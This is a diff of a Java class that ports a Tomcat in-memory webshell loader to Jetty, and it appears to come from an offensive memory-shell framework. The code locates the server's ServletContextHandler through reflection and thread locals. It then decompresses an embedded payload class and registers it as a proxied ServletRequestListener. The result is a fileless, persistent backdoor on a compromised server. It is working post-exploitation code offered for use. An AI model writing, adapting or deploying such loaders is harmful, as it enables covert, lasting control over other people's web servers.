@@ -17,90 +17,76 @@ import java.util.zip.GZIPInputStream;
 /**
  * @author Whoopsunix
  * <p>
- * 5-10 全版本  直接从 ClassLoader 中寻找 容易打崩
  */
-@Middleware(Middleware.Tomcat)
+@Middleware(Middleware.Jetty)
 @MemShell(MemShell.Listener)
 @JavaClassType(JavaClassType.AutoFind)
 @JavaClassModifiable({JavaClassModifiable.CLASSNAME})
-public class TomcatAutoListenerThreadLoader {
+public class JettyAutoFindListenerThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
 
-    public TomcatAutoListenerThreadLoader() {
+    public JettyAutoFindListenerThreadLoader() {
     }
 
     static {
         try {
-            // 获取 standardContext
-            Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
+            // 获取 servletContext
+//            Object servletContext = getServletContext();
+            Object servletContext = getTargetObject("org.eclipse.jetty.servlet.ServletContextHandler");
 
-            inject(standardContext);
+            inject(servletContext);
 
         } catch (Throwable e) {
 
         }
     }
 
-    public static void inject(Object standardContext) throws Exception {
-        Object[] applicationEventListenersObjects = null;
-        List applicationEventListeners;
-        Object object = getObject();
-        try {
-            applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
-            for (int i = 0; i < applicationEventListeners.size(); i++) {
-                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
-                    return;
-                }
-            }
-        } catch (Exception e) {
 
-        }
+//    public static void inject(Object standardContext) throws Exception {
+//    }
 
+    /**
+     * Jetty Listener
+     */
+    public static void inject(Object servletContext) throws Exception {
+        // Jetty 9
         try {
-            applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
-            for (int i = 0; i < applicationEventListenersObjects.length; i++) {
-                Object applicationEventListenersObject = applicationEventListenersObjects[i];
-                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
-                    Object h = getFieldValue(applicationEventListenersObject, "h");
-                    Object h2 = getFieldValue(object, "h");
-                    if (h.getClass().getName().contains(h2.getClass().getName())) {
-                        return;
-                    }
-                } else {
-                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
-                        return;
+            Object[] _eventListeners = (Object[]) getFieldValue(servletContext, "_eventListeners");
+            if (_eventListeners != null) {
+                for (int i = 0; i < _eventListeners.length; i++) {
+                    if (_eventListeners[i] instanceof Proxy) {
+                        if (getFieldValue(_eventListeners[i], "h").getClass().getName().equalsIgnoreCase(CLASSNAME)) {
+                            return;
+                        }
                     }
                 }
             }
         } catch (Exception e) {
-
         }
 
-        if (applicationEventListenersObjects != null) {
-            // 5 6
-            Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
-            System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
-            newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
-            setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
-        } else {
-            // bypass
-            List applicationEventListenersList = (List) getFieldValue(standardContext, "applicationEventListenersList");
-            applicationEventListenersList.add(object);
-
-            // 7 8 9 10
-//            invokeMethod(standardContext.getClass(), standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
+        // Jetty 10
+        try {
+            List _eventListeners = (List) getFieldValue(servletContext, "_eventListener");
+            if (_eventListeners != null) {
+                for (int i = 0; i < _eventListeners.size(); i++) {
+                    if (_eventListeners.get(i) instanceof Proxy) {
+                        if (getFieldValue(_eventListeners.get(i), "h").getClass().getName().equalsIgnoreCase(CLASSNAME)) {
+                            return;
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
         }
-    }
 
-    public static Object getObject() throws Exception {
         // 动态代理兼容 javax jakarta
-        Class servletRequestListenerClass = null;
+        Class listenerClass = null;
         try {
-            servletRequestListenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
+            listenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
         } catch (Exception e) {
             try {
-                servletRequestListenerClass = Class.forName("javax.servlet.ServletRequestListener");
+                listenerClass = Class.forName("javax.servlet.ServletRequestListener");
             } catch (ClassNotFoundException ex) {
 
             }
@@ -116,12 +102,40 @@ public class TomcatAutoListenerThreadLoader {
         } catch (Exception e) {
             clazz = classLoader.loadClass(CLASSNAME);
         }
-        Object javaObject = clazz.newInstance();
-        Object object = Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, (InvocationHandler) javaObject);
 
-        return object;
+        Object javaObject = clazz.newInstance();
+        Object object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);
+
+        // Jetty 9 10
+        invokeMethod(servletContext, "addEventListener", new Class[]{Class.forName("java.util.EventListener")}, new Object[]{object});
+        System.out.println(1);
     }
 
+    public static Object getServletContext() throws Exception {
+        try {
+            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
+            Object[] table = (Object[]) getFieldValue(threadLocals, "table");
+            for (int i = 0; i < table.length; i++) {
+                Object entry = table[i];
+                if (entry == null)
+                    continue;
+                Object value = getFieldValue(entry, "value");
+                if (value == null)
+                    continue;
+
+                // 9 10 org.eclipse.jetty.server.HttpConnection$HttpChannelOverHttp
+                if (value.getClass().getName().equals("org.eclipse.jetty.servlet.ServletContextHandler$Context")) {
+                    Object servletContext = getFieldValue(value, "this$0");
+                    return servletContext;
+                }
+            }
+        } catch (Exception e) {
+
+        }
+
+
+        return null;
+    }
 
     // tools
     public static byte[] decompress(String gzipObject) throws Exception {
@@ -174,6 +188,14 @@ public class TomcatAutoListenerThreadLoader {
         field.set(obj, value);
     }
 
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        } catch (Exception e) {
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
+    }
+
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
@@ -181,8 +203,9 @@ public class TomcatAutoListenerThreadLoader {
         return object;
     }
 
+
     public static Object getTargetObject(String className) throws Exception {
-        List<ClassLoader> activeClassLoaders = new TomcatAutoListenerThreadLoader().getActiveClassLoaders();
+        List<ClassLoader> activeClassLoaders = new JettyAutoFindListenerThreadLoader().getActiveClassLoaders();
 
         Class cls = getTargetClass(className, activeClassLoaders);
 
